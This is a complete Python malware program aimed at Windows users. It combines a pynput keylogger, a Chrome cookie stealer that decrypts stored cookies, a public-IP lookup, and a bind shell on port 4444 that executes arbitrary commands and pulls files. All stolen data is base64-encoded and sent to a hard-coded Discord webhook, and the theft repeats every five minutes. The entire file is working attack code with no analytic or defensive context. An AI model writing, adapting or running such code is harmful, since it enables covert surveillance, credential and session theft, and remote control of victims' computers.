import pynput.keyboard
import requests
import sqlite3
import win32crypt
import os
import time
import socket
import subprocess
import threading
import base64
from shutil import copyfile

WEBHOOK_URL = "https://discord.com/api/webhooks/1389901389626474536/W5db6NsgZodvx5XV4rLDOzWhnzlKd-NFMqIHU-yCHWtVQldeMqUEq7B4abB_hoRbZQ_6"
KEYLOG = ""
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 4444       # Common port, blends with HTTPS

def send_to_webhook(data, label):
    try:
        encoded = base64.b64encode(data.encode()).decode()  # Encode to avoid webhook issues
        payload = {"content": f"[{label} {time.ctime()}]: {encoded}"}
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except:
        pass

# Get Public IP
def get_public_ip():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        send_to_webhook(ip, "Public_IP")
    except:
        send_to_webhook("Failed to get public IP", "Public_IP")

# Keylogger
def keylogger():
    global KEYLOG
    def on_press(key):
        global KEYLOG
        try:
            KEYLOG += str(key).replace("'", "") + " "
            if len(KEYLOG) > 100:  # Batch send every 100 chars
                send_to_webhook(KEYLOG, "Keylog")
                KEYLOG = ""
        except:
            pass
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Cookie Stealer (Chrome)
def steal_cookies():
    try:
        # Chrome cookie path (Windows)
        path = os.path.join(os.getenv("APPDATA"), r"..\Local\Google\Chrome\User Data\Default\Cookies")
        if not os.path.exists(path):
            return
        # Copy to avoid file lock
        temp_db = "temp_cookies.db"
        copyfile(path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = ""
        for host, name, enc_value in cursor.fetchall():
            try:
                decrypted = win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode()
                cookies += f"{host} | {name} | {decrypted}\n"
            except:
                continue
        if cookies:
            send_to_webhook(cookies, "Cookies")
        conn.close()
        os.remove(temp_db)  # Clean up
    except:
        pass

# Reverse Shell
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST, PORT))
        s.listen(1)
        conn, addr = s.accept()
        send_to_webhook(f"Connected from {addr}", "Shell")
        while True:
            try:
                conn.send(b"cmd: ")
                cmd = conn.recv(1024).decode().strip()
                if cmd.lower() in ["exit", "quit"]:
                    break
                if cmd.startswith("get "):
                    file_path = cmd[4:]
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            data = base64.b64encode(f.read()).decode()
                            send_to_webhook(data, f"File_{os.path.basename(file_path)}")
                    else:
                        conn.send(b"File not found\n")
                else:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
                    send_to_webhook(result, "Shell_Output")
                    conn.send(result.encode())
            except:
                break
        conn.close()
        s.close()
    except:
        pass

# Main
if __name__ == "__main__":
    # Send public IP on startup
    threading.Thread(target=get_public_ip, daemon=True).start()
    # Start keylogger in a thread
    threading.Thread(target=keylogger, daemon=True).start()
    # Run cookie stealer and reverse shell
    while True:
        steal_cookies()
        threading.Thread(target=reverse_shell, daemon=True).start()
        time.sleep(300)  # Wait 5 minutes before next cookie grab